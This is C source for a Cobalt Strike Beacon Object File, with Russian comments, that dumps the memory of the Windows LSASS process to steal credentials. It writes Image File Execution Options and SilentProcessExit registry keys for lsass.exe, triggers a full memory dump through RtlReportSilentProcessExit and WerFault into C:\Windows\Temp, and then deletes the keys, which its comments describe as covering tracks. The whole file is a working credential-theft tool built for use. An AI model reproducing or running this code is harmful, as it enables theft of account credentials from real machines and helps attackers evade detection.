#include <windows.h>
#include "beacon.h"

// --- NTSTATUS ---
typedef LONG NTSTATUS;
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)

// --- СТРОГИЕ ИМПОРТЫ СИСТЕМНЫХ API ---
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCreateKeyExA(HKEY, LPCSTR, DWORD, LPSTR, DWORD, REGSAM, LPSECURITY_ATTRIBUTES, PHKEY, LPDWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegSetValueExA(HKEY, LPCSTR, DWORD, DWORD, const BYTE*, DWORD);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegDeleteKeyA(HKEY, LPCSTR);
DECLSPEC_IMPORT LSTATUS WINAPI ADVAPI32$RegCloseKey(HKEY);
DECLSPEC_IMPORT int WINAPI KERNEL32$lstrlenA(LPCSTR);

DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$OpenProcess(DWORD, BOOL, DWORD);
DECLSPEC_IMPORT BOOL    WINAPI KERNEL32$CloseHandle(HANDLE);
DECLSPEC_IMPORT DWORD   WINAPI KERNEL32$GetLastError(void);

// Недокументированная функция NTDLL, которая посылает сигнал WerFault
DECLSPEC_IMPORT NTSTATUS WINAPI NTDLL$RtlReportSilentProcessExit(HANDLE, NTSTATUS);


void go(char* args, int len) {
    datap parser;
    int target_pid = 0;
    
    // 1. Читаем PID LSASS из аргументов (-p PID)
    BeaconDataParse(&parser, args, len);
    target_pid = BeaconDataInt(&parser);

    if (target_pid == 0) {
        BeaconPrintf(CALLBACK_ERROR, "LSASS PID is required. Run loader with: -p <PID>");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[*] Target LSASS PID: %d", target_pid);
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Configuring Registry for Silent Process Exit...");

    HKEY hKeyIfeo = NULL;
    HKEY hKeySpe = NULL;
    DWORD disp;

    // 2. Настраиваем IFEO (Image File Execution Options)
    // Устанавливаем флаг FLG_MONITOR_SILENT_PROCESS_EXIT (0x200) для lsass.exe
    const char* ifeoPath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\lsass.exe";
    if (ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, ifeoPath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKeyIfeo, &disp) == ERROR_SUCCESS) {
        DWORD globalFlag = 0x200; 
        ADVAPI32$RegSetValueExA(hKeyIfeo, "GlobalFlag", 0, REG_DWORD, (const BYTE*)&globalFlag, sizeof(globalFlag));
        ADVAPI32$RegCloseKey(hKeyIfeo);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to set IFEO key. Error: %lu (Are you running as Admin?)", KERNEL32$GetLastError());
        return;
    }

    // 3. Настраиваем параметры самого дампа (SilentProcessExit)
    const char* spePath = "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\lsass.exe";
    if (ADVAPI32$RegCreateKeyExA(HKEY_LOCAL_MACHINE, spePath, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKeySpe, &disp) == ERROR_SUCCESS) {
        DWORD reportingMode = 2; // 2 = MiniDump
        DWORD dumpType = 2;      // 2 = MiniDumpWithFullMemory (Полный дамп памяти)
        const char* dumpFolder = "C:\\Windows\\Temp"; // Папка, куда WerFault положит дамп

        ADVAPI32$RegSetValueExA(hKeySpe, "ReportingMode", 0, REG_DWORD, (const BYTE*)&reportingMode, sizeof(reportingMode));
        ADVAPI32$RegSetValueExA(hKeySpe, "DumpType", 0, REG_DWORD, (const BYTE*)&dumpType, sizeof(dumpType));
        ADVAPI32$RegSetValueExA(hKeySpe, "LocalDumpFolder", 0, REG_SZ, (const BYTE*)dumpFolder, KERNEL32$lstrlenA(dumpFolder) + 1);
        ADVAPI32$RegCloseKey(hKeySpe);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[+] Registry configured. Triggering WerFault.exe...");

    // 4. ТРИГГЕР: Открываем LSASS и вызываем RtlReportSilentProcessExit
    // Огромный плюс: нам нужны только минимальные права PROCESS_QUERY_INFORMATION | PROCESS_VM_READ
    HANDLE hLsass = KERNEL32$OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, target_pid);
    if (hLsass) {
        NTSTATUS status = NTDLL$RtlReportSilentProcessExit(hLsass, 0);
        if (status == STATUS_SUCCESS) {
            BeaconPrintf(CALLBACK_OUTPUT, "[+] SUCCESS! RtlReportSilentProcessExit signaled.");
            BeaconPrintf(CALLBACK_OUTPUT, "[+] Check C:\\Windows\\Temp for 'lsass.exe-(PID).dmp'");
        } else {
            BeaconPrintf(CALLBACK_ERROR, "[-] RtlReportSilentProcessExit failed with NTSTATUS: 0x%08X", status);
        }
        KERNEL32$CloseHandle(hLsass);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "[-] Failed to open LSASS. Error: %lu", KERNEL32$GetLastError());
    }

    // 5. OPSEC: Убираем за собой следы в реестре
    BeaconPrintf(CALLBACK_OUTPUT, "[*] Cleaning up Registry keys (OPSEC)...");
    ADVAPI32$RegDeleteKeyA(HKEY_LOCAL_MACHINE, spePath);
    ADVAPI32$RegDeleteKeyA(HKEY_LOCAL_MACHINE, ifeoPath);
}